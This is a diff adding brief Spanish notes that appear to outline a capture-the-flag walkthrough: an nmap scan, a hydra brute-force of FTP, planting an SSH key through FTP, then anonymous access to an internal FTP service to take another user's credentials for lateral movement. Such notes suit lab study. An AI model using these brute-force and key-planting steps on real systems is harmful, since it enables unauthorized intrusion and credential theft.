@@ -1,0 +1,11 @@
+User.txt
+nmap ... -p 2121
+hydra -L diccionarios/names.txt -P diccionarios/passwords.txt IP ftp -s PORT
+Conectar ftp
+crear carpeta en el .ssh
+ssh-keygen y authorized_keys
+subir archivo
+entrar por ssh
+netstat -a (servicio ftp -> 127.0.0.1 2211)
+ftp -> open 127.0.0.1 2211 y entrar como anonymous, obtener creds de otro usuario y movimiento lateral
+Leer archivo y es otro user. movimiento lateral
